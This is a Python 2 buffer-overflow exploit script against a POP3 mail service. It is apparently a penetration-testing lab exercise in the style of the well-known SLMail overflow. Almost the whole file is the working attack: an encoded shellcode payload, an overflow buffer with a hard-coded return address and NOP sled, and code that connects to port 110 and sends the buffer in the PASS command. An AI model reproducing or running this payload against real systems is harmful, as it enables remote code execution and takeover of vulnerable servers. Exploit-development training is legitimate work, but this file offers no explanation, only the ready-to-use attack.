#!/usr/bin/python
import socket


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode = ("\xba\xc3\x8a\x46\x02\xdb\xc9\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x31\x53\x12\x83\xeb\xfc\x03\x90\x84\xa4\xf7\xea\x71\xaa"
"\xf8\x12\x82\xcb\x71\xf7\xb3\xcb\xe6\x7c\xe3\xfb\x6d\xd0\x08"
"\x77\x23\xc0\x9b\xf5\xec\xe7\x2c\xb3\xca\xc6\xad\xe8\x2f\x49"
"\x2e\xf3\x63\xa9\x0f\x3c\x76\xa8\x48\x21\x7b\xf8\x01\x2d\x2e"
"\xec\x26\x7b\xf3\x87\x75\x6d\x73\x74\xcd\x8c\x52\x2b\x45\xd7"
"\x74\xca\x8a\x63\x3d\xd4\xcf\x4e\xf7\x6f\x3b\x24\x06\xb9\x75"
"\xc5\xa5\x84\xb9\x34\xb7\xc1\x7e\xa7\xc2\x3b\x7d\x5a\xd5\xf8"
"\xff\x80\x50\x1a\xa7\x43\xc2\xc6\x59\x87\x95\x8d\x56\x6c\xd1"
"\xc9\x7a\x73\x36\x62\x86\xf8\xb9\xa4\x0e\xba\x9d\x60\x4a\x18"
"\xbf\x31\x36\xcf\xc0\x21\x99\xb0\x64\x2a\x34\xa4\x14\x71\x51"
"\x09\x15\x89\xa1\x05\x2e\xfa\x93\x8a\x84\x94\x9f\x43\x03\x63"
"\xdf\x79\xf3\xfb\x1e\x82\x04\xd2\xe4\xd6\x54\x4c\xcc\x56\x3f"
"\x8c\xf1\x82\x90\xdc\x5d\x7d\x51\x8c\x1d\x2d\x39\xc6\x91\x12"
"\x59\xe9\x7b\x3b\xf0\x10\xec\x4e\x0e\x1a\x52\x26\x12\x1a\xab"
"\x0c\x9b\xfc\xc1\x62\xca\x57\x7e\x1a\x57\x23\x1f\xe3\x4d\x4e"
"\x1f\x6f\x62\xaf\xee\x98\x0f\xa3\x87\x68\x5a\x99\x0e\x76\x70"
"\xb5\xcd\xe5\x1f\x45\x9b\x15\x88\x12\xcc\xe8\xc1\xf6\xe0\x53"
"\x78\xe4\xf8\x02\x43\xac\x26\xf7\x4a\x2d\xaa\x43\x69\x3d\x72"
"\x4b\x35\x69\x2a\x1a\xe3\xc7\x8c\xf4\x45\xb1\x46\xaa\x0f\x55"
"\x1e\x80\x8f\x23\x1f\xcd\x79\xcb\xae\xb8\x3f\xf4\x1f\x2d\xc8"
"\x8d\x7d\xcd\x37\x44\xc6\xed\xd5\x4c\x33\x86\x43\x05\xfe\xcb"
"\x73\xf0\x3d\xf2\xf7\xf0\xbd\x01\xe7\x71\xbb\x4e\xaf\x6a\xb1"
"\xdf\x5a\x8c\x66\xdf\x4e")

buffer = "A"*2606 +"\xe3\x41\x4b\x5f" + "\x90"*16 + shellcode + "C" *(3500-2606-4-351-16)

try:
        print "\nSending evil buffer..."
        s.connect(('10.11.22.57',110))
        data = s.recv(1024)
        s.send('USER username' +'\r\n')
        data = s.recv(1024)
        s.send('PASS ' + buffer + '\r\n')
        print "\nDone!."
except:
        print "Could not connect to POP3!"

